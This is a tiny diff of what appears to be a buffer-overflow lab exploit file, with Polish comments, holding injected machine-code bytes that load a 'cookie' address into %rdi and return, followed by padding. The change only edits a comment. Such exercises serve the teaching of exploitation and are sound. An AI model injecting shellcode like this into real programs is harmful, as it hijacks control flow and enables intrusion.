@@ -1,4 +1,4 @@
-/* wstrzyknięty kod */
+/* wstrzyknięty kod - wskaznik na COOKIE do %rdi */
 48 c7 c7 d0 66 63 55 c3
 /* padding */
 00 00 00 00 00 00 00 00
